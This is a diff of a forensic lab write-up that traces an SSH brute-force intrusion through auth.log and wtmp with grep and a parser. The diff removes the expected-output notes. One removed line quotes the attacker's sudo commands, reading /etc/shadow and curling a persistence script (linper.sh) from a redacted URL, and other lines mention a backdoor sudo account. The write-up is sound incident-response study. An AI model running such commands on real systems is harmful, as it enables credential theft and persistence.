@@ -47,7 +47,6 @@ grep -iE 'invalid|fail' auth.log
 ```
 
 ![Screenshot: grep output showing mass failed SSH attempts from attacker IP](Screenshots/task1_brute_force_grep.png)
-*Expected output: Dense stream of "Invalid user" and "authentication failure" lines, all from the same external IP.*
 
 ---
 
@@ -62,7 +61,6 @@ grep -iE 'accept|success' auth.log
 ```
 
 ![Screenshot: grep output showing accepted password lines including attacker IP and legitimate IP](Screenshots/task2_accepted_passwords.png)
-*Expected output: Four "Accepted password" lines — one from the legitimate IP, two from the attacker IP for root, one later for the backdoor account.*
 
 ---
 
@@ -79,7 +77,6 @@ python3 utmp.py wtmp | grep '[REDACTED_ATTACKER_IP]'
 ```
 
 ![Screenshot: utmp.py parsed output filtered by attacker IP](Screenshots/task3_wtmp_parsed.png)
-*Expected output: Two rows — one for root, one for the backdoor account — both showing the attacker IP and timestamp columns.*
 
 The parsed timestamp came out wrong. The binary value was being read in local time, not UTC, causing a 5-hour offset. Cross-referencing against `auth.log` corrected it. Worth noting: `auth.log` shows two accepted root logins from the attacker IP within about a minute of each other. The first is the brute-force tool finding the password. The second is the operator manually logging in. `wtmp` records only the manual session, which is why it shows one root entry.
 
@@ -96,7 +93,6 @@ grep 'New session' auth.log
 ```
 
 ![Screenshot: grep output showing four "New session" lines with session numbers and usernames](Screenshots/task4_new_session.png)
-*Expected output: Four lines — multiple root sessions and one for the backdoor account, each with a session number and timestamp.*
 
 ---
 
@@ -113,7 +109,6 @@ grep -iE 'add|create' auth.log
 ```
 
 ![Screenshot: grep output showing groupadd, useradd, and usermod sudo lines for backdoor account](Screenshots/task5_account_creation.png)
-*Expected output: Group creation, user creation with UID/GID/home/shell, and two usermod lines adding the account to the sudo and shadow sudo groups.*
 
 ---
 
@@ -136,7 +131,6 @@ grep 'sshd\[REDACTED_PID\]' auth.log
 ```
 
 ![Screenshot: grep output for specific sshd PID showing accepted password and received disconnect lines](Screenshots/task7_session_end.png)
-*Expected output: Three lines for that PID — accepted password, received disconnect, and disconnected from user, all tied to the attacker IP.*
 
 ---
 
@@ -151,7 +145,6 @@ grep 'sudo' auth.log
 ```
 
 ![Screenshot: grep output showing sudo command lines including the curl download](Screenshots/task8_sudo_curl.png)
-*Expected output: sudo log lines showing TTY, PWD, USER=root, and COMMAND fields. One is /usr/bin/cat /etc/shadow, the other is /usr/bin/curl [REDACTED URL]/linper.sh.*
 
 ---
 
